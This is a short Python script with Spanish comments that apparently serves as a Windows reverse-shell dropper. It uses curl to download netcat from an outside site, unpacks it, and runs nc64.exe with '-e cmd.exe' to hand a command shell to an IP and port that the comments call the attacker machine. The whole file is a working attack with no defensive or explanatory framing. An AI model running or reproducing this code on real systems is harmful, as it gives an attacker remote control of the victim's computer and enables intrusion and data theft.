import os
import shutil

# os.system es para ejecutar un comando
#descargamos netcat y se le da el nombre que se desee ejemplo netcat.zip -o
os.system("curl  https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip -o netcat.zip ")

# Para descomprimir 
shutil.unpack_archive("netcat.zip")

#ingresar a la carpeta descomprimida
os.chdir("netcat-1.11")

#comando para ejecutar revershell
#nc64.exe es el ejecutable
#la ip es la maquina atacante y puerto que se desee
os.system("nc64.exe  192.168.1.7 443 -e cmd.exe")